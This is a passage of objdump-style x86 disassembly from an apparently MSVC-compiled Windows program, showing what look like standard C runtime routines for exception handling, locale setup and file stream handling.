  403e8d:	ff 75 10             	push   0x10(%ebp)
  403e90:	ff 75 0c             	push   0xc(%ebp)
  403e93:	ff 75 08             	push   0x8(%ebp)
  403e96:	e8 05 00 00 00       	call   0x403ea0
  403e9b:	83 c4 10             	add    $0x10,%esp
  403e9e:	5d                   	pop    %ebp
  403e9f:	c3                   	ret
  403ea0:	6a 10                	push   $0x10
  403ea2:	68 c8 74 41 00       	push   $0x4174c8
  403ea7:	e8 64 db ff ff       	call   0x401a10
  403eac:	ff 75 10             	push   0x10(%ebp)
  403eaf:	ff 75 0c             	push   0xc(%ebp)
  403eb2:	ff 75 08             	push   0x8(%ebp)
  403eb5:	e8 1f 02 00 00       	call   0x4040d9
  403eba:	83 c4 0c             	add    $0xc,%esp
  403ebd:	8b f0                	mov    %eax,%esi
  403ebf:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403ec2:	e8 5c ec ff ff       	call   0x402b23
  403ec7:	ff 40 18             	incl   0x18(%eax)
  403eca:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403ed1:	3b 75 14             	cmp    0x14(%ebp),%esi
  403ed4:	74 6b                	je     0x403f41
  403ed6:	83 fe ff             	cmp    $0xffffffff,%esi
  403ed9:	0f 8e a9 00 00 00    	jle    0x403f88
  403edf:	8b 7d 10             	mov    0x10(%ebp),%edi
  403ee2:	3b 77 04             	cmp    0x4(%edi),%esi
  403ee5:	0f 8d 9d 00 00 00    	jge    0x403f88
  403eeb:	8b 47 08             	mov    0x8(%edi),%eax
  403eee:	8b 0c f0             	mov    (%eax,%esi,8),%ecx
  403ef1:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403ef4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403efb:	83 7c f0 04 00       	cmpl   $0x0,0x4(%eax,%esi,8)
  403f00:	74 30                	je     0x403f32
  403f02:	51                   	push   %ecx
  403f03:	57                   	push   %edi
  403f04:	ff 75 08             	push   0x8(%ebp)
  403f07:	e8 ea 01 00 00       	call   0x4040f6
  403f0c:	83 c4 0c             	add    $0xc,%esp
  403f0f:	68 03 01 00 00       	push   $0x103
  403f14:	ff 75 08             	push   0x8(%ebp)
  403f17:	8b 47 08             	mov    0x8(%edi),%eax
  403f1a:	ff 74 f0 04          	push   0x4(%eax,%esi,8)
  403f1e:	e8 4d 01 00 00       	call   0x404070
  403f23:	eb 0d                	jmp    0x403f32
  403f25:	ff 75 ec             	push   -0x14(%ebp)
  403f28:	e8 6b e8 ff ff       	call   0x402798
  403f2d:	59                   	pop    %ecx
  403f2e:	c3                   	ret
  403f2f:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403f32:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403f39:	8b 75 e0             	mov    -0x20(%ebp),%esi
  403f3c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403f3f:	eb 90                	jmp    0x403ed1
  403f41:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403f48:	e8 27 00 00 00       	call   0x403f74
  403f4d:	3b 75 14             	cmp    0x14(%ebp),%esi
  403f50:	75 36                	jne    0x403f88
  403f52:	56                   	push   %esi
  403f53:	ff 75 10             	push   0x10(%ebp)
  403f56:	ff 75 08             	push   0x8(%ebp)
  403f59:	e8 98 01 00 00       	call   0x4040f6
  403f5e:	83 c4 0c             	add    $0xc,%esp
  403f61:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403f64:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403f6b:	59                   	pop    %ecx
  403f6c:	5f                   	pop    %edi
  403f6d:	5e                   	pop    %esi
  403f6e:	5b                   	pop    %ebx
  403f6f:	c9                   	leave
  403f70:	c3                   	ret
  403f71:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  403f74:	e8 aa eb ff ff       	call   0x402b23
  403f79:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  403f7d:	7e 08                	jle    0x403f87
  403f7f:	e8 9f eb ff ff       	call   0x402b23
  403f84:	ff 48 18             	decl   0x18(%eax)
  403f87:	c3                   	ret
  403f88:	e8 d2 25 00 00       	call   0x40655f
  403f8d:	cc                   	int3
  403f8e:	55                   	push   %ebp
  403f8f:	8b ec                	mov    %esp,%ebp
  403f91:	83 ec 1c             	sub    $0x1c,%esp
  403f94:	53                   	push   %ebx
  403f95:	56                   	push   %esi
  403f96:	8b 75 0c             	mov    0xc(%ebp),%esi
  403f99:	57                   	push   %edi
  403f9a:	85 f6                	test   %esi,%esi
  403f9c:	0f 84 80 00 00 00    	je     0x404022
  403fa2:	8b 3e                	mov    (%esi),%edi
  403fa4:	33 db                	xor    %ebx,%ebx
  403fa6:	85 ff                	test   %edi,%edi
  403fa8:	7e 71                	jle    0x40401b
  403faa:	8b 45 08             	mov    0x8(%ebp),%eax
  403fad:	8b d3                	mov    %ebx,%edx
  403faf:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403fb2:	8b 40 1c             	mov    0x1c(%eax),%eax
  403fb5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403fb8:	8b 40 0c             	mov    0xc(%eax),%eax
  403fbb:	8b 08                	mov    (%eax),%ecx
  403fbd:	83 c0 04             	add    $0x4,%eax
  403fc0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403fc3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403fc6:	8b c8                	mov    %eax,%ecx
  403fc8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403fcb:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  403fce:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403fd1:	85 c0                	test   %eax,%eax
  403fd3:	7e 38                	jle    0x40400d
  403fd5:	8b 46 04             	mov    0x4(%esi),%eax
  403fd8:	03 c2                	add    %edx,%eax
  403fda:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403fdd:	ff 75 ec             	push   -0x14(%ebp)
  403fe0:	ff 31                	push   (%ecx)
  403fe2:	50                   	push   %eax
  403fe3:	e8 e4 f9 ff ff       	call   0x4039cc
  403fe8:	83 c4 0c             	add    $0xc,%esp
  403feb:	85 c0                	test   %eax,%eax
  403fed:	75 19                	jne    0x404008
  403fef:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403ff2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403ff5:	48                   	dec    %eax
  403ff6:	83 c1 04             	add    $0x4,%ecx
  403ff9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403ffc:	85 c0                	test   %eax,%eax
  403ffe:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404001:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404004:	7f d7                	jg     0x403fdd
  404006:	eb 02                	jmp    0x40400a
  404008:	b3 01                	mov    $0x1,%bl
  40400a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40400d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404010:	83 c2 10             	add    $0x10,%edx
  404013:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404016:	83 ef 01             	sub    $0x1,%edi
  404019:	75 ab                	jne    0x403fc6
  40401b:	5f                   	pop    %edi
  40401c:	5e                   	pop    %esi
  40401d:	8a c3                	mov    %bl,%al
  40401f:	5b                   	pop    %ebx
  404020:	c9                   	leave
  404021:	c3                   	ret
  404022:	e8 38 25 00 00       	call   0x40655f
  404027:	cc                   	int3
  404028:	55                   	push   %ebp
  404029:	8b ec                	mov    %esp,%ebp
  40402b:	ff 75 10             	push   0x10(%ebp)
  40402e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404031:	ff 55 0c             	call   *0xc(%ebp)
  404034:	5d                   	pop    %ebp
  404035:	c2 0c 00             	ret    $0xc
  404038:	55                   	push   %ebp
  404039:	8b ec                	mov    %esp,%ebp
  40403b:	ff 75 14             	push   0x14(%ebp)
  40403e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404041:	ff 75 10             	push   0x10(%ebp)
  404044:	ff 55 0c             	call   *0xc(%ebp)
  404047:	5d                   	pop    %ebp
  404048:	c2 10 00             	ret    $0x10
  40404b:	55                   	push   %ebp
  40404c:	8b ec                	mov    %esp,%ebp
  40404e:	8b 45 08             	mov    0x8(%ebp),%eax
  404051:	8b 40 1c             	mov    0x1c(%eax),%eax
  404054:	5d                   	pop    %ebp
  404055:	c3                   	ret
  404056:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  40405a:	b8 b4 2c 41 00       	mov    $0x412cb4,%eax
  40405f:	0f 45 41 04          	cmovne 0x4(%ecx),%eax
  404063:	c3                   	ret
  404064:	cc                   	int3
  404065:	cc                   	int3
  404066:	cc                   	int3
  404067:	cc                   	int3
  404068:	cc                   	int3
  404069:	cc                   	int3
  40406a:	cc                   	int3
  40406b:	cc                   	int3
  40406c:	cc                   	int3
  40406d:	cc                   	int3
  40406e:	cc                   	int3
  40406f:	cc                   	int3
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	83 ec 04             	sub    $0x4,%esp
  404076:	53                   	push   %ebx
  404077:	51                   	push   %ecx
  404078:	8b 45 0c             	mov    0xc(%ebp),%eax
  40407b:	83 c0 0c             	add    $0xc,%eax
  40407e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404081:	8b 45 08             	mov    0x8(%ebp),%eax
  404084:	55                   	push   %ebp
  404085:	ff 75 10             	push   0x10(%ebp)
  404088:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40408b:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  40408e:	e8 ed eb ff ff       	call   0x402c80
  404093:	56                   	push   %esi
  404094:	57                   	push   %edi
  404095:	ff d0                	call   *%eax
  404097:	5f                   	pop    %edi
  404098:	5e                   	pop    %esi
  404099:	8b dd                	mov    %ebp,%ebx
  40409b:	5d                   	pop    %ebp
  40409c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40409f:	55                   	push   %ebp
  4040a0:	8b eb                	mov    %ebx,%ebp
  4040a2:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4040a8:	75 05                	jne    0x4040af
  4040aa:	b9 02 00 00 00       	mov    $0x2,%ecx
  4040af:	51                   	push   %ecx
  4040b0:	e8 cb eb ff ff       	call   0x402c80
  4040b5:	5d                   	pop    %ebp
  4040b6:	59                   	pop    %ecx
  4040b7:	5b                   	pop    %ebx
  4040b8:	c9                   	leave
  4040b9:	c2 0c 00             	ret    $0xc
  4040bc:	56                   	push   %esi
  4040bd:	e8 61 ea ff ff       	call   0x402b23
  4040c2:	8b 70 04             	mov    0x4(%eax),%esi
  4040c5:	85 f6                	test   %esi,%esi
  4040c7:	74 0a                	je     0x4040d3
  4040c9:	8b ce                	mov    %esi,%ecx
  4040cb:	ff 15 48 21 41 00    	call   *0x412148
  4040d1:	ff d6                	call   *%esi
  4040d3:	e8 94 23 00 00       	call   0x40646c
  4040d8:	cc                   	int3
  4040d9:	55                   	push   %ebp
  4040da:	8b ec                	mov    %esp,%ebp
  4040dc:	8b 45 10             	mov    0x10(%ebp),%eax
  4040df:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4040e2:	81 78 04 80 00 00 00 	cmpl   $0x80,0x4(%eax)
  4040e9:	7f 06                	jg     0x4040f1
  4040eb:	0f be 41 08          	movsbl 0x8(%ecx),%eax
  4040ef:	5d                   	pop    %ebp
  4040f0:	c3                   	ret
  4040f1:	8b 41 08             	mov    0x8(%ecx),%eax
  4040f4:	5d                   	pop    %ebp
  4040f5:	c3                   	ret
  4040f6:	55                   	push   %ebp
  4040f7:	8b ec                	mov    %esp,%ebp
  4040f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4040fc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4040ff:	89 48 08             	mov    %ecx,0x8(%eax)
  404102:	5d                   	pop    %ebp
  404103:	c3                   	ret
  404104:	55                   	push   %ebp
  404105:	8b ec                	mov    %esp,%ebp
  404107:	57                   	push   %edi
  404108:	8b 7d 08             	mov    0x8(%ebp),%edi
  40410b:	80 7f 04 00          	cmpb   $0x0,0x4(%edi)
  40410f:	74 48                	je     0x404159
  404111:	8b 0f                	mov    (%edi),%ecx
  404113:	85 c9                	test   %ecx,%ecx
  404115:	74 42                	je     0x404159
  404117:	8d 51 01             	lea    0x1(%ecx),%edx
  40411a:	8a 01                	mov    (%ecx),%al
  40411c:	41                   	inc    %ecx
  40411d:	84 c0                	test   %al,%al
  40411f:	75 f9                	jne    0x40411a
  404121:	2b ca                	sub    %edx,%ecx
  404123:	53                   	push   %ebx
  404124:	56                   	push   %esi
  404125:	8d 59 01             	lea    0x1(%ecx),%ebx
  404128:	53                   	push   %ebx
  404129:	e8 92 23 00 00       	call   0x4064c0
  40412e:	8b f0                	mov    %eax,%esi
  404130:	59                   	pop    %ecx
  404131:	85 f6                	test   %esi,%esi
  404133:	74 19                	je     0x40414e
  404135:	ff 37                	push   (%edi)
  404137:	53                   	push   %ebx
  404138:	56                   	push   %esi
  404139:	e8 92 23 00 00       	call   0x4064d0
  40413e:	8b 45 0c             	mov    0xc(%ebp),%eax
  404141:	8b ce                	mov    %esi,%ecx
  404143:	83 c4 0c             	add    $0xc,%esp
  404146:	33 f6                	xor    %esi,%esi
  404148:	89 08                	mov    %ecx,(%eax)
  40414a:	c6 40 04 01          	movb   $0x1,0x4(%eax)
  40414e:	56                   	push   %esi
  40414f:	e8 5c 23 00 00       	call   0x4064b0
  404154:	59                   	pop    %ecx
  404155:	5e                   	pop    %esi
  404156:	5b                   	pop    %ebx
  404157:	eb 0b                	jmp    0x404164
  404159:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40415c:	8b 07                	mov    (%edi),%eax
  40415e:	89 01                	mov    %eax,(%ecx)
  404160:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  404164:	5f                   	pop    %edi
  404165:	5d                   	pop    %ebp
  404166:	c3                   	ret
  404167:	55                   	push   %ebp
  404168:	8b ec                	mov    %esp,%ebp
  40416a:	56                   	push   %esi
  40416b:	8b 75 08             	mov    0x8(%ebp),%esi
  40416e:	80 7e 04 00          	cmpb   $0x0,0x4(%esi)
  404172:	74 08                	je     0x40417c
  404174:	ff 36                	push   (%esi)
  404176:	e8 35 23 00 00       	call   0x4064b0
  40417b:	59                   	pop    %ecx
  40417c:	c6 46 04 00          	movb   $0x0,0x4(%esi)
  404180:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  404186:	5e                   	pop    %esi
  404187:	5d                   	pop    %ebp
  404188:	c3                   	ret
  404189:	55                   	push   %ebp
  40418a:	8b ec                	mov    %esp,%ebp
  40418c:	83 ec 14             	sub    $0x14,%esp
  40418f:	8b 45 08             	mov    0x8(%ebp),%eax
  404192:	53                   	push   %ebx
  404193:	57                   	push   %edi
  404194:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404197:	bb 20 05 93 19       	mov    $0x19930520,%ebx
  40419c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40419f:	85 ff                	test   %edi,%edi
  4041a1:	74 2e                	je     0x4041d1
  4041a3:	f6 07 10             	testb  $0x10,(%edi)
  4041a6:	74 1e                	je     0x4041c6
  4041a8:	8b 08                	mov    (%eax),%ecx
  4041aa:	83 e9 04             	sub    $0x4,%ecx
  4041ad:	56                   	push   %esi
  4041ae:	51                   	push   %ecx
  4041af:	8b 01                	mov    (%ecx),%eax
  4041b1:	8b 70 20             	mov    0x20(%eax),%esi
  4041b4:	8b ce                	mov    %esi,%ecx
  4041b6:	8b 78 18             	mov    0x18(%eax),%edi
  4041b9:	ff 15 48 21 41 00    	call   *0x412148
  4041bf:	ff d6                	call   *%esi
  4041c1:	5e                   	pop    %esi
  4041c2:	85 ff                	test   %edi,%edi
  4041c4:	74 0b                	je     0x4041d1
  4041c6:	f6 07 08             	testb  $0x8,(%edi)
  4041c9:	b8 00 40 99 01       	mov    $0x1994000,%eax
  4041ce:	0f 45 d8             	cmovne %eax,%ebx
  4041d1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4041d4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4041d7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4041da:	50                   	push   %eax
  4041db:	6a 03                	push   $0x3
  4041dd:	6a 01                	push   $0x1
  4041df:	68 63 73 6d e0       	push   $0xe06d7363
  4041e4:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4041e7:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4041ea:	ff 15 a0 20 41 00    	call   *0x4120a0
  4041f0:	5f                   	pop    %edi
  4041f1:	5b                   	pop    %ebx
  4041f2:	c9                   	leave
  4041f3:	c2 08 00             	ret    $0x8
  4041f6:	cc                   	int3
  4041f7:	cc                   	int3
  4041f8:	cc                   	int3
  4041f9:	cc                   	int3
  4041fa:	cc                   	int3
  4041fb:	cc                   	int3
  4041fc:	cc                   	int3
  4041fd:	cc                   	int3
  4041fe:	cc                   	int3
  4041ff:	cc                   	int3
  404200:	8b ff                	mov    %edi,%edi
  404202:	55                   	push   %ebp
  404203:	8b ec                	mov    %esp,%ebp
  404205:	8b d1                	mov    %ecx,%edx
  404207:	33 c0                	xor    %eax,%eax
  404209:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40420c:	88 42 14             	mov    %al,0x14(%edx)
  40420f:	89 02                	mov    %eax,(%edx)
  404211:	88 42 08             	mov    %al,0x8(%edx)
  404214:	88 42 1c             	mov    %al,0x1c(%edx)
  404217:	88 42 24             	mov    %al,0x24(%edx)
  40421a:	85 c9                	test   %ecx,%ecx
  40421c:	74 07                	je     0x404225
  40421e:	8b 01                	mov    (%ecx),%eax
  404220:	8b 49 04             	mov    0x4(%ecx),%ecx
  404223:	eb 13                	jmp    0x404238
  404225:	39 05 90 9e 41 00    	cmp    %eax,0x419e90
  40422b:	75 15                	jne    0x404242
  40422d:	a1 28 92 41 00       	mov    0x419228,%eax
  404232:	8b 0d 2c 92 41 00    	mov    0x41922c,%ecx
  404238:	c6 42 14 01          	movb   $0x1,0x14(%edx)
  40423c:	89 4a 10             	mov    %ecx,0x10(%edx)
  40423f:	89 42 0c             	mov    %eax,0xc(%edx)
  404242:	8b c2                	mov    %edx,%eax
  404244:	5d                   	pop    %ebp
  404245:	c2 04 00             	ret    $0x4
  404248:	8b ff                	mov    %edi,%edi
  40424a:	56                   	push   %esi
  40424b:	57                   	push   %edi
  40424c:	8b f9                	mov    %ecx,%edi
  40424e:	80 7f 14 02          	cmpb   $0x2,0x14(%edi)
  404252:	75 09                	jne    0x40425d
  404254:	8b 07                	mov    (%edi),%eax
  404256:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
  40425d:	80 7f 1c 00          	cmpb   $0x0,0x1c(%edi)
  404261:	74 0b                	je     0x40426e
  404263:	8b 77 18             	mov    0x18(%edi),%esi
  404266:	e8 84 01 00 00       	call   0x4043ef
  40426b:	89 70 10             	mov    %esi,0x10(%eax)
  40426e:	80 7f 24 00          	cmpb   $0x0,0x24(%edi)
  404272:	74 0d                	je     0x404281
  404274:	8b 77 20             	mov    0x20(%edi),%esi
  404277:	8b cf                	mov    %edi,%ecx
  404279:	e8 71 01 00 00       	call   0x4043ef
  40427e:	89 70 14             	mov    %esi,0x14(%eax)
  404281:	5f                   	pop    %edi
  404282:	5e                   	pop    %esi
  404283:	c3                   	ret
  404284:	6a 10                	push   $0x10
  404286:	68 00 76 41 00       	push   $0x417600
  40428b:	e8 80 d7 ff ff       	call   0x401a10
  404290:	8b 75 08             	mov    0x8(%ebp),%esi
  404293:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404296:	85 f6                	test   %esi,%esi
  404298:	75 23                	jne    0x4042bd
  40429a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40429d:	c6 40 1c 01          	movb   $0x1,0x1c(%eax)
  4042a1:	c7 40 18 16 00 00 00 	movl   $0x16,0x18(%eax)
  4042a8:	50                   	push   %eax
  4042a9:	33 ff                	xor    %edi,%edi
  4042ab:	57                   	push   %edi
  4042ac:	57                   	push   %edi
  4042ad:	57                   	push   %edi
  4042ae:	57                   	push   %edi
  4042af:	57                   	push   %edi
  4042b0:	e8 29 26 00 00       	call   0x4068de
  4042b5:	83 c4 18             	add    $0x18,%esp
  4042b8:	83 c8 ff             	or     $0xffffffff,%eax
  4042bb:	eb 40                	jmp    0x4042fd
  4042bd:	8b 46 0c             	mov    0xc(%esi),%eax
  4042c0:	90                   	nop
  4042c1:	c1 e8 0c             	shr    $0xc,%eax
  4042c4:	56                   	push   %esi
  4042c5:	a8 01                	test   $0x1,%al
  4042c7:	74 08                	je     0x4042d1
  4042c9:	e8 a1 2a 00 00       	call   0x406d6f
  4042ce:	59                   	pop    %ecx
  4042cf:	eb e7                	jmp    0x4042b8
  4042d1:	33 ff                	xor    %edi,%edi
  4042d3:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4042d6:	e8 ff 27 00 00       	call   0x406ada
  4042db:	59                   	pop    %ecx
  4042dc:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4042df:	ff 75 0c             	push   0xc(%ebp)
  4042e2:	56                   	push   %esi
  4042e3:	e8 33 00 00 00       	call   0x40431b
  4042e8:	59                   	pop    %ecx
  4042e9:	59                   	pop    %ecx
  4042ea:	8b f8                	mov    %eax,%edi
  4042ec:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4042ef:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4042f6:	e8 18 00 00 00       	call   0x404313
  4042fb:	8b c7                	mov    %edi,%eax
  4042fd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404300:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404307:	59                   	pop    %ecx
  404308:	5f                   	pop    %edi
  404309:	5e                   	pop    %esi
  40430a:	5b                   	pop    %ebx
  40430b:	c9                   	leave
  40430c:	c3                   	ret
  40430d:	8b 75 e0             	mov    -0x20(%ebp),%esi
  404310:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  404313:	56                   	push   %esi
  404314:	e8 d5 27 00 00       	call   0x406aee
  404319:	59                   	pop    %ecx
  40431a:	c3                   	ret
  40431b:	8b ff                	mov    %edi,%edi
  40431d:	55                   	push   %ebp
  40431e:	8b ec                	mov    %esp,%ebp
  404320:	56                   	push   %esi
  404321:	8b 75 08             	mov    0x8(%ebp),%esi
  404324:	85 f6                	test   %esi,%esi
  404326:	75 23                	jne    0x40434b
  404328:	8b 45 0c             	mov    0xc(%ebp),%eax
  40432b:	50                   	push   %eax
  40432c:	c6 40 1c 01          	movb   $0x1,0x1c(%eax)
  404330:	c7 40 18 16 00 00 00 	movl   $0x16,0x18(%eax)
  404337:	33 c0                	xor    %eax,%eax
  404339:	50                   	push   %eax
  40433a:	50                   	push   %eax
  40433b:	50                   	push   %eax
  40433c:	50                   	push   %eax
  40433d:	50                   	push   %eax
  40433e:	e8 9b 25 00 00       	call   0x4068de
  404343:	83 c4 18             	add    $0x18,%esp
  404346:	83 c8 ff             	or     $0xffffffff,%eax
  404349:	eb 5b                	jmp    0x4043a6
  40434b:	8b 46 0c             	mov    0xc(%esi),%eax
  40434e:	57                   	push   %edi
  40434f:	83 cf ff             	or     $0xffffffff,%edi
  404352:	90                   	nop
  404353:	c1 e8 0d             	shr    $0xd,%eax
  404356:	a8 01                	test   $0x1,%al
  404358:	74 42                	je     0x40439c
  40435a:	ff 75 0c             	push   0xc(%ebp)
  40435d:	56                   	push   %esi
  40435e:	e8 21 2d 00 00       	call   0x407084
  404363:	56                   	push   %esi
  404364:	8b f8                	mov    %eax,%edi
  404366:	e8 01 2b 00 00       	call   0x406e6c
  40436b:	83 c4 0c             	add    $0xc,%esp
  40436e:	ff 75 0c             	push   0xc(%ebp)
  404371:	56                   	push   %esi
  404372:	e8 28 26 00 00       	call   0x40699f
  404377:	59                   	pop    %ecx
  404378:	50                   	push   %eax
  404379:	e8 15 28 00 00       	call   0x406b93
  40437e:	59                   	pop    %ecx
  40437f:	59                   	pop    %ecx
  404380:	85 c0                	test   %eax,%eax
  404382:	79 05                	jns    0x404389
  404384:	83 cf ff             	or     $0xffffffff,%edi
  404387:	eb 13                	jmp    0x40439c
  404389:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  40438d:	74 0d                	je     0x40439c
  40438f:	ff 76 1c             	push   0x1c(%esi)
  404392:	e8 59 23 00 00       	call   0x4066f0
  404397:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  40439b:	59                   	pop    %ecx
  40439c:	56                   	push   %esi
  40439d:	e8 cd 29 00 00       	call   0x406d6f
  4043a2:	59                   	pop    %ecx
  4043a3:	8b c7                	mov    %edi,%eax
  4043a5:	5f                   	pop    %edi
  4043a6:	5e                   	pop    %esi
  4043a7:	5d                   	pop    %ebp
  4043a8:	c3                   	ret
  4043a9:	8b ff                	mov    %edi,%edi
  4043ab:	55                   	push   %ebp
  4043ac:	8b ec                	mov    %esp,%ebp
  4043ae:	51                   	push   %ecx
  4043af:	56                   	push   %esi
  4043b0:	57                   	push   %edi
  4043b1:	8b f9                	mov    %ecx,%edi
  4043b3:	ff 15 68 20 41 00    	call   *0x412068
  4043b9:	80 7f 08 00          	cmpb   $0x0,0x8(%edi)
  4043bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4043c0:	75 0b                	jne    0x4043cd
  4043c2:	33 c0                	xor    %eax,%eax
  4043c4:	c6 47 08 01          	movb   $0x1,0x8(%edi)
  4043c8:	89 47 04             	mov    %eax,0x4(%edi)
  4043cb:	eb 03                	jmp    0x4043d0
  4043cd:	8b 47 04             	mov    0x4(%edi),%eax
  4043d0:	50                   	push   %eax
  4043d1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4043d4:	50                   	push   %eax
  4043d5:	e8 44 32 00 00       	call   0x40761e
  4043da:	59                   	pop    %ecx
  4043db:	59                   	pop    %ecx
  4043dc:	ff 75 fc             	push   -0x4(%ebp)
  4043df:	8b f0                	mov    %eax,%esi
  4043e1:	89 37                	mov    %esi,(%edi)
  4043e3:	ff 15 6c 20 41 00    	call   *0x41206c
  4043e9:	5f                   	pop    %edi
  4043ea:	8b c6                	mov    %esi,%eax
  4043ec:	5e                   	pop    %esi
  4043ed:	c9                   	leave
  4043ee:	c3                   	ret
  4043ef:	8b ff                	mov    %edi,%edi
  4043f1:	56                   	push   %esi
  4043f2:	8b f1                	mov    %ecx,%esi
  4043f4:	83 3e 00             	cmpl   $0x0,(%esi)
  4043f7:	75 09                	jne    0x404402
  4043f9:	e8 ab ff ff ff       	call   0x4043a9
  4043fe:	85 c0                	test   %eax,%eax
  404400:	74 04                	je     0x404406
  404402:	8b 06                	mov    (%esi),%eax
  404404:	5e                   	pop    %esi
  404405:	c3                   	ret
  404406:	e8 54 21 00 00       	call   0x40655f
  40440b:	cc                   	int3
  40440c:	8b ff                	mov    %edi,%edi
  40440e:	55                   	push   %ebp
  40440f:	8b ec                	mov    %esp,%ebp
  404411:	83 ec 28             	sub    $0x28,%esp
  404414:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404417:	56                   	push   %esi
  404418:	6a 00                	push   $0x0
  40441a:	e8 e1 fd ff ff       	call   0x404200
  40441f:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404422:	50                   	push   %eax
  404423:	ff 75 08             	push   0x8(%ebp)
  404426:	e8 59 fe ff ff       	call   0x404284
  40442b:	59                   	pop    %ecx
  40442c:	59                   	pop    %ecx
  40442d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404430:	8b f0                	mov    %eax,%esi
  404432:	e8 11 fe ff ff       	call   0x404248
  404437:	8b c6                	mov    %esi,%eax
  404439:	5e                   	pop    %esi
  40443a:	c9                   	leave
  40443b:	c3                   	ret
  40443c:	6a 10                	push   $0x10
  40443e:	68 20 76 41 00       	push   $0x417620
  404443:	e8 c8 d5 ff ff       	call   0x401a10
  404448:	8b 75 08             	mov    0x8(%ebp),%esi
  40444b:	85 f6                	test   %esi,%esi
  40444d:	75 14                	jne    0x404463
  40444f:	e8 9d 33 00 00       	call   0x4077f1
  404454:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40445a:	e8 fc 24 00 00       	call   0x40695b
  40445f:	33 c0                	xor    %eax,%eax
  404461:	eb 66                	jmp    0x4044c9
  404463:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404466:	85 ff                	test   %edi,%edi
  404468:	74 e5                	je     0x40444f
  40446a:	80 3f 00             	cmpb   $0x0,(%edi)
  40446d:	74 e0                	je     0x40444f
  40446f:	80 3e 00             	cmpb   $0x0,(%esi)
  404472:	75 0d                	jne    0x404481
  404474:	e8 78 33 00 00       	call   0x4077f1
  404479:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40447f:	eb de                	jmp    0x40445f
  404481:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404484:	50                   	push   %eax
  404485:	e8 7c 28 00 00       	call   0x406d06
  40448a:	59                   	pop    %ecx
  40448b:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40448f:	75 0d                	jne    0x40449e
  404491:	e8 5b 33 00 00       	call   0x4077f1
  404496:	c7 00 18 00 00 00    	movl   $0x18,(%eax)
  40449c:	eb c1                	jmp    0x40445f
  40449e:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  4044a2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4044a6:	ff 75 e4             	push   -0x1c(%ebp)
  4044a9:	ff 75 10             	push   0x10(%ebp)
  4044ac:	57                   	push   %edi
  4044ad:	56                   	push   %esi
  4044ae:	e8 2b 37 00 00       	call   0x407bde
  4044b3:	83 c4 10             	add    $0x10,%esp
